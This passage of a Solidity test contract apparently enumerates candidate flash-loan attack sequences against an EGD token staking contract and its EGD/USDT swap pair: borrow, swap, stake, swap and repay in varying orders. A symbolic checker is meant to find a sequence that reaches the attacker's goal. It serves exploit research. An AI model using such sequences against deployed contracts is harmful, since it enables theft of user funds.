        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand127(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand128(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand129(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand130(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand131(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand132(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand133(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand134(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand135(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand136(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand137(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand138(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand139(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand140(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand141(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand142(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand143(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand144(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand145(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand146(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand147(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand148(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand149(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand150(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand151(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand152(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand153(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand154(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand155(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand156(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_usdt(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand157(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand158(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand159(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand160(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_usdt(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand161(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand162(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand163(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand164(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand165(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand166(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand167(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand168(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        swap_pair_usdt_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand169(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand170(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand171(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand172(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand173(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand174(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand175(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand176(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand177(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand178(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand179(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand180(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand181(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand182(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand183(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand184(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand185(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand186(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        swap_pair_egd_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand187(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }
